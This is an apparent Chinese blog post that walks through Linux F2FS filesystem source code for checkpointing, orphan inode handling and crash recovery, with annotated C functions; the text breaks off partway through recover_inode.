<p>这个初始化函数中与后滚恢复相关的函数有<code>get_valid_checkpoint</code>和<code>build_segment_manager</code>,分别对应<code>f2fs_checkpoint</code>相关的数据和curseg相关的数据  </p>
<h4 id="get-valid-checkpoint-恢复f2fs-checkpoint"><a href="#get-valid-checkpoint-恢复f2fs-checkpoint" class="headerlink" title="get_valid_checkpoint // 恢复f2fs_checkpoint"></a>get_valid_checkpoint // 恢复<code>f2fs_checkpoint</code></h4><p><strong>定义</strong>在fs/f2fs/checkpoint.c中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// struct f2fs_sb_info在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_valid_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">cp_block</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * sbi指向f2fs_sb_info结构体的子数据raw_super, 是一个原始超级块指针</span></span><br><span class="line"><span class="comment">     * raw_super指向f2fs_super_block类型的任意结构体</span></span><br><span class="line"><span class="comment">     * 这里相当于fsb就是原来的超级块指针</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_super_block</span> *<span class="title">fsb</span> =</span> sbi-&gt;raw_super;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cp1</span>, *<span class="title">cp2</span>, *<span class="title">cur_page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> blk_size = vsbi-&gt;blocksize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp1_version = <span class="number">0</span>, cp2_version = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_start_blk_no;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kzalloc在include/linux/slab.h中</span></span><br><span class="line"><span class="comment">     * blk_size是需要分配的内存大小, GFP_KERNEL为要分配的内存类型</span></span><br><span class="line"><span class="comment">     * 查询&quot;内存分配掩码&quot;知: GFP_KERNEL是一种常规的分配方式，可能会阻塞。</span></span><br><span class="line"><span class="comment">     * 这个标志在睡眠安全时用在进程的长下文代码中。</span></span><br><span class="line"><span class="comment">     * 为了获取调用者所需的内存，内核会尽力而为。这个标志应该是首选标志.</span></span><br><span class="line"><span class="comment">     * ckpt是原始checkpoint指针, 指向f2fs_checkpoint类型的任意结构体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    sbi-&gt;ckpt = kzalloc(blk_size, GFP_KERNEL); <span class="comment">// 分配f2fs_checkpoint的堆空间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如上述操作未完成, 说明内存不足</span></span><br><span class="line">    <span class="keyword">if</span> (!sbi-&gt;ckpt)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 找到并读取两个cp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cp_start_blk_no = le64_to_cpu(fsb-&gt;start_segment_checkpoint); <span class="comment">// 从sbi获得checkpoint的起始地址</span></span><br><span class="line">    cp1 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp1_version); <span class="comment">// 读取该地址并检查其合法性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second checkpoint pack should start at the next segment */</span></span><br><span class="line">    cp_start_blk_no += <span class="number">1</span> &lt;&lt; le32_to_cpu(fsb-&gt;log_blocks_per_seg);</span><br><span class="line">    cp2 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp2_version);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cp1 &amp;&amp; cp2) &#123; <span class="comment">// 根据版本的高低决定使用哪个版本的cp</span></span><br><span class="line">        <span class="keyword">if</span> (ver_after(cp2_version, cp1_version))</span><br><span class="line">            cur_page = cp2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp1) &#123;</span><br><span class="line">        cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp2) &#123;</span><br><span class="line">        cur_page = cp2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">goto</span> fail_no_cp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// page_address返回页面的虚拟地址, 这个cur_page就是以上获取的正在使用的checkpoint</span></span><br><span class="line">    cp_block = (struct f2fs_checkpoint *)page_address(cur_page);</span><br><span class="line">    <span class="built_in">memcpy</span>(sbi-&gt;ckpt, cp_block, blk_size); <span class="comment">// 复制数据到sbi中，用于运行中的管理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* f2fs_put_page在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="comment">     * 查看!PageLocked(cp1)和!PageLocked(cp1)时的堆栈信息.</span></span><br><span class="line"><span class="comment">     * 解除cp1和cp2的锁定并释放页面缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_put_page(cp1, <span class="number">1</span>);</span><br><span class="line">    f2fs_put_page(cp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail_no_cp:</span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="build-segment-manager-恢复curseg"><a href="#build-segment-manager-恢复curseg" class="headerlink" title="build_segment_manager // 恢复curseg"></a>build_segment_manager // 恢复curseg</h4><p>恢复curseg的功能主要在<code>build_segment_manager</code>函数的<code>build_curseg</code>函数中完成<br>build_segment_manager和build_curseg<strong>定义</strong>在fs/f2fs/segment.c  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">build_curseg</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">array</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">array</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">array</span>) * NR_CURSEG_TYPE, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">array</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    SM_I(sbi)-&gt;curseg_array = <span class="built_in">array</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化curseg的空间</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CURSEG_TYPE; i++) &#123;</span><br><span class="line">        mutex_init(&amp;<span class="built_in">array</span>[i].curseg_mutex);</span><br><span class="line">        <span class="built_in">array</span>[i].sum_blk = kzalloc(PAGE_CACHE_SIZE, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">array</span>[i].sum_blk)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="built_in">array</span>[i].segno = NULL_SEGNO;</span><br><span class="line">        <span class="built_in">array</span>[i].next_blkoff = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从磁盘中，读取恢复curseg的信息</span></span><br><span class="line">    <span class="keyword">return</span> restore_curseg_summaries(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="restore-curseg-summaries-读取curseg"><a href="#restore-curseg-summaries-读取curseg" class="headerlink" title="restore_curseg_summaries // 读取curseg"></a>restore_curseg_summaries // 读取curseg</h5><p>function in /fs/f2fs/segment.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">restore_curseg_summaries</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type = CURSEG_HOT_DATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查CP_COMPACT_SUM_FLAG的标志，这个标志用于检查是否按COMPACTED的方式读取data summary</span></span><br><span class="line"><span class="comment">     * is_set_ckpt_flags fs/f2fs/f2fs.h, line 467 (as a function)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (is_set_ckpt_flags(F2FS_CKPT(sbi), CP_COMPACT_SUM_FLAG)) &#123;</span><br><span class="line">        <span class="comment">/* restore for compacted data summary */</span></span><br><span class="line">        <span class="keyword">if</span> (read_compacted_summaries(sbi))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        type = CURSEG_HOT_NODE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果没有COMPACTED标识，则DATA和NODE都使用NORMAL的方式进行恢复</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (; type &lt;= CURSEG_COLD_NODE; type++)</span><br><span class="line">        <span class="keyword">if</span> (read_normal_summaries(sbi, type))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="read-normal-summaries-读取summaries"><a href="#read-normal-summaries-读取summaries" class="headerlink" title="read_normal_summaries //读取summaries"></a>read_normal_summaries //读取summaries</h6><p>这个函数对于F2FS的正常关闭，重新启动时读取的summary的方式都是类似的，都是根据HOT/WARM/COLD的顺序，读取对应的block，然后将数据保存到curseg对应的类型当中。这里<strong>重点考虑出现了宕机的情况的恢复</strong>。</p>
<hr>
<h2 id="checkpoint-c"><a href="#checkpoint-c" class="headerlink" title="checkpoint.c"></a>checkpoint.c</h2><h3 id="grab-meta-page-和-get-meta-page-获取元页面"><a href="#grab-meta-page-和-get-meta-page-获取元页面" class="headerlink" title="grab_meta_page 和 get_meta_page// 获取元页面"></a>grab_meta_page 和 get_meta_page// 获取元页面</h3><p>不同之处在于，<code>grab_meta_page</code>在返回给定缓存中给定索引处的锁定页面后，调用<code>wait_on_page_writeback</code>等待页面完成回写再<code>SetPageUptodate</code>更新页面，然后返回page<br>而<code>get_meta_page</code>，在返回给定缓存中给定索引处的锁定页面后，调用<code>mark_page_accessed</code>将页面标记为可访问，然后返回page</p>
<hr>
<p>f2fs_write_meta_page f2fs_write_meta_pages sync_meta_pages与写页面相关</p>
<hr>
<h3 id="f2fs-set-meta-page-dirty-设置元页面为脏"><a href="#f2fs-set-meta-page-dirty-设置元页面为脏" class="headerlink" title="f2fs_set_meta_page_dirty // 设置元页面为脏"></a>f2fs_set_meta_page_dirty // 设置元页面为脏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f2fs_set_meta_page_dirty</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> page-&gt;mapping;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(mapping-&gt;host-&gt;i_sb);</span><br><span class="line"></span><br><span class="line">    SetPageUptodate(page); <span class="comment">// 更新页面</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果该page不是脏页，则调用__set_page_dirty_nobuffers将页面设置为脏，但不是所有缓冲区都设置为脏</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!PageDirty(page)) &#123;</span><br><span class="line">        __set_page_dirty_nobuffers(page);</span><br><span class="line">        inc_page_count(sbi, F2FS_DIRTY_META);</span><br><span class="line">        F2FS_SET_SB_DIRT(sbi);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="check-orphan-space-检查孤立空间大小"><a href="#check-orphan-space-检查孤立空间大小" class="headerlink" title="check_orphan_space // 检查孤立空间大小"></a>check_orphan_space // 检查孤立空间大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_orphan_space</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_orphans;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 考虑段中的512个块，cp和log段摘要需要5个块</span></span><br><span class="line"><span class="comment">     * 剩余的块用于保留有限的orphan entries，为cp pack保留一个段，我们最多可以有1020 * 507个orphan entries</span></span><br><span class="line"><span class="comment">     * F2FS_ORPHANS_PER_BLOCK用于孤立索引节点的管理(#define F2FS_ORPHANS_PER_BLOCK 1020)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    max_orphans = (sbi-&gt;blocks_per_seg - <span class="number">5</span>) * F2FS_ORPHANS_PER_BLOCK;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 获取互斥量</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;n_orphans &gt;= max_orphans)</span><br><span class="line">    err = -ENOSPC;</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 释放此前被锁定的互斥量</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-orphan-inode"><a href="#add-orphan-inode" class="headerlink" title="add_orphan_inode"></a>add_orphan_inode</h3><h3 id="remove-orphan-inode"><a href="#remove-orphan-inode" class="headerlink" title="remove_orphan_inode"></a>remove_orphan_inode</h3><h3 id="recover-orphan-inode-恢复孤立索引节点"><a href="#recover-orphan-inode-恢复孤立索引节点" class="headerlink" title="recover_orphan_inode // 恢复孤立索引节点"></a>recover_orphan_inode // 恢复孤立索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_orphan_inode</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">nid_t</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> f2fs_iget(sbi-&gt;sb, ino); <span class="comment">// 获取元空间的索引节点</span></span><br><span class="line">    BUG_ON(IS_ERR(inode)); <span class="comment">// 查看 inode指针未指向最后一个page 时的堆栈内容</span></span><br><span class="line">    clear_nlink(inode); <span class="comment">// 直接将索引节点的链接数清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用iput截断所有数据 */</span></span><br><span class="line">    iput(inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-orphan-inodes"><a href="#recover-orphan-inodes" class="headerlink" title="recover_orphan_inodes"></a>recover_orphan_inodes</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recover_orphan_inodes</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">block_t</span> start_blk, orphan_blkaddr, i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果umount和journal_present标志值为0则直接return 0</span></span><br><span class="line">    <span class="keyword">if</span> (!(F2FS_CKPT(sbi)-&gt;ckpt_flags &amp; CP_ORPHAN_PRESENT_FLAG))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sbi-&gt;por_doing = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取块起始地址和orphan块地址</span></span><br><span class="line">    start_blk = __start_cp_addr(sbi) + <span class="number">1</span>;</span><br><span class="line">    orphan_blkaddr = __start_sum_addr(sbi) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; orphan_blkaddr; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> get_meta_page(sbi, start_blk + i);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_orphan_block</span> *<span class="title">orphan_blk</span>;</span></span><br><span class="line"></span><br><span class="line">        orphan_blk = (struct f2fs_orphan_block *)page_address(page);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; le32_to_cpu(orphan_blk-&gt;entry_count); j++) &#123;</span><br><span class="line">            <span class="keyword">nid_t</span> ino = le32_to_cpu(orphan_blk-&gt;ino[j]);</span><br><span class="line">            recover_orphan_inode(sbi, ino);</span><br><span class="line">        &#125;</span><br><span class="line">        f2fs_put_page(page, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* clear Orphan Flag */</span></span><br><span class="line">    F2FS_CKPT(sbi)-&gt;ckpt_flags &amp;= (~CP_ORPHAN_PRESENT_FLAG);</span><br><span class="line">    sbi-&gt;por_doing = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-valid-checkpoint-获取有效的checkpoint"><a href="#get-valid-checkpoint-获取有效的checkpoint" class="headerlink" title="get_valid_checkpoint // 获取有效的checkpoint"></a>get_valid_checkpoint // 获取有效的checkpoint</h3><p>在<code>f2fs_fill_super</code>中已介绍</p>
<h3 id="do-checkpoint"><a href="#do-checkpoint" class="headerlink" title="do_checkpoint"></a>do_checkpoint</h3><p>首先刷新所有的NAT/SIT页面，然后根据curseg修改checkpoint的信息和summary的信息。<br><strong>修改checkpoint</strong>：对<code>f2fs_checkpoint</code>的修改主要是把curseg的当前segno，blkoff等写入到<code>f2fs_checkpoint</code>中，以便下次重启时可以根据这些信息，重建curseg。  </p>
<p><strong>summary的回写</strong>：根据需要回写的summary的数目，返回需要写回的block的数目<code>data_sum_blocks</code>，如果data_sum_blocks = 1 或者 2，则表示回写1个或者2个block，则设置CP_COMPACT_SUM_FLAG标志。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data_sum_blocks = npages_for_summary_flush(sbi);</span><br><span class="line"><span class="keyword">if</span> (data_sum_blocks &lt; <span class="number">3</span>)</span><br><span class="line">    ckpt-&gt;ckpt_flags |= CP_COMPACT_SUM_FLAG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ckpt-&gt;ckpt_flags &amp;= (~CP_COMPACT_SUM_FLAG);</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">然后调用**write_data_summaries**将summary写入磁盘。  </span><br><span class="line">`write_data_summaries(sbi, start_blk);<span class="comment">//将data summary以及里面的journal写入磁盘`  </span></span><br><span class="line">`write_data_summaries`函数会判断一下是否设置了CP_COMPACT_SUM_FLAG标志，采取不同的方法写入磁盘。  </span><br><span class="line"></span><br><span class="line">### write_checkpoint <span class="comment">// 写checkpoint</span></span><br><span class="line"></span><br><span class="line">```<span class="function">c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">bool</span> blocked, <span class="keyword">bool</span> is_umount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">ckpt</span> =</span> F2FS_CKPT(sbi);<span class="comment">//从sbi读取当前cp的数据结构</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ckpt_ver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!blocked) &#123;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">    block_operations(sbi);<span class="comment">//将文件系统的所有操作停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *按照DATA, NODE, META的顺序将数据从page同步写入到磁盘</span></span><br><span class="line"><span class="comment">     *（META包括了SIT/NAT/checkpoint）</span></span><br><span class="line"><span class="comment">     *这里写入磁盘的meta并不是最新的meta</span></span><br><span class="line"><span class="comment">     *（可能是在此之前使用fsync/fdatasync时触发了checkpoint，meta还没有完全写入磁盘时起到阻塞的作用）</span></span><br><span class="line"><span class="comment">     *最新的meta还只保存在cache中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_submit_bio(sbi, DATA, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, NODE, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, META, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 完成数据的写入后更新更新版本号</span></span><br><span class="line"><span class="comment">     * 以便于SIT entries和seg summaries写入正确的位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ckpt_ver = le64_to_cpu(ckpt-&gt;checkpoint_ver);</span><br><span class="line">    ckpt-&gt;checkpoint_ver = cpu_to_le64(++ckpt_ver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更新元数据的NAT区域, SIT区域</span></span><br><span class="line"><span class="comment">     * 刷写所有nat entries, sit entries到磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    flush_nat_entries(sbi);</span><br><span class="line">    flush_sit_entries(sbi);</span><br><span class="line"></span><br><span class="line">    reset_victim_segmap(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlock all the fs_lock[] in do_checkpoint()</span></span><br><span class="line"><span class="comment">     * 调用do_checkpoint()将最新的元数据Checkpoint区域以及Summary区域写入磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    do_checkpoint(sbi, is_umount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复文件系统的操作</span></span><br><span class="line">    unblock_operations(sbi);</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="recovery-c"><a href="#recovery-c" class="headerlink" title="recovery.c"></a>recovery.c</h2><h3 id="space-for-roll-forward-是否可以前滚回复"><a href="#space-for-roll-forward-是否可以前滚回复" class="headerlink" title="space_for_roll_forward // 是否可以前滚回复"></a>space_for_roll_forward // 是否可以前滚回复</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">space_for_roll_forward</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 最后有效块数与分配有效块数之和小于等于用户块数，返回true</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;last_valid_block_count + sbi-&gt;alloc_valid_block_count</span><br><span class="line">        &gt; sbi-&gt;user_block_count)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-fsync-inode-获取fsync索引节点"><a href="#get-fsync-inode-获取fsync索引节点" class="headerlink" title="get_fsync_inode // 获取fsync索引节点"></a>get_fsync_inode // 获取fsync索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个entry(获取fsync索引节点)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fsync_inode_entry *<span class="title">get_fsync_inode</span><span class="params">(struct list_head *head,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">nid_t</span> ino)</span> <span class="comment">// typedef u32 nid_t</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">this</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历列表，struct list_head做循环游标，head为列表头</span></span><br><span class="line">    list_for_each(<span class="keyword">this</span>, head) &#123;</span><br><span class="line">        <span class="comment">// 获取目录项的结构</span></span><br><span class="line">        entry = list_entry(<span class="keyword">this</span>, struct fsync_inode_entry, <span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// entry指向vfs inode指针指向的结构体inode中的子数据i_ino与给定ino(inode number)相等则返回目录项</span></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;inode-&gt;i_ino == ino)</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-dentry-恢复目录项"><a href="#recover-dentry-恢复目录项" class="headerlink" title="recover_dentry // 恢复目录项"></a>recover_dentry // 恢复目录项</h3><figure class="highlight plaintext"><figcaption><span>恢复目录项</span></figcaption><table><tr><td class="code"><pre><span class="line">static int recover_dentry(struct page *ipage, struct inode *inode)</span><br><span class="line">&#123;</span><br><span class="line">    // kmap函数将分配到的高端内存映射到永久内存映射区域</span><br><span class="line">    struct f2fs_node *raw_node = (struct f2fs_node *)kmap(ipage);</span><br><span class="line">    struct f2fs_inode *raw_inode = &amp;(raw_node-&gt;i);</span><br><span class="line">    struct dentry dent, parent;</span><br><span class="line">    struct f2fs_dir_entry *de;</span><br><span class="line">    struct page *page;</span><br><span class="line">    struct inode *dir;</span><br><span class="line">    int err = 0;</span><br><span class="line"></span><br><span class="line">    if (!raw_node-&gt;footer.dentry)</span><br><span class="line">        goto out;</span><br><span class="line"></span><br><span class="line">    // 获取inode所属文件的超级块指针和父索引节点号</span><br><span class="line">    dir = f2fs_iget(inode-&gt;i_sb, le32_to_cpu(raw_inode-&gt;i_pino));</span><br><span class="line">    if (IS_ERR(dir)) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        goto out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent.d_inode = dir; // 与该目录项关联的inode</span><br><span class="line">    dent.d_parent = &amp;parent; // 父目录的目录项</span><br><span class="line"></span><br><span class="line">    // 目录项名称</span><br><span class="line">    dent.d_name.len = le32_to_cpu(raw_inode-&gt;i_namelen);</span><br><span class="line">    dent.d_name.name = raw_inode-&gt;i_name;</span><br><span class="line"></span><br><span class="line">    // 根据以上信息找到目录项</span><br><span class="line">    de = f2fs_find_entry(dir, &amp;dent.d_name, &amp;page);</span><br><span class="line">    if (de) &#123;</span><br><span class="line">        kunmap(page);</span><br><span class="line">        f2fs_put_page(page, 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        f2fs_add_link(&amp;dent, inode);</span><br><span class="line">    &#125;</span><br><span class="line">    iput(dir);</span><br><span class="line">out:</span><br><span class="line">    kunmap(ipage);</span><br><span class="line">    return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-inode-恢复inode"><a href="#recover-inode-恢复inode" class="headerlink" title="recover_inode // 恢复inode"></a>recover_inode // 恢复inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">recover_inode</span><span class="params">(struct inode *inode, struct page *node_page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取节点页面的映射虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *kaddr = page_address(node_page);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_node</span> *<span class="title">raw_node</span> =</span> (struct f2fs_node *)kaddr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode</span> *<span class="title">raw_inode</span> =</span> &amp;(raw_node-&gt;i);</span><br><span class="line"></span><br><span class="line">    inode-&gt;i_mode = le32_to_cpu(raw_inode-&gt;i_mode); <span class="comment">//  文件类型和访问权限</span></span><br><span class="line">    i_size_write(inode, le64_to_cpu(raw_inode-&gt;i_size)); <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    inode-&gt;i_atime.tv_sec = le32_to_cpu(raw_inode-&gt;i_atime); <span class="comment">// 文件最后一次访问时间</span></span><br><span class="line">    inode-&gt;i_ctime.tv_sec = le32_to_cpu(raw_inode-&gt;i_ctime); 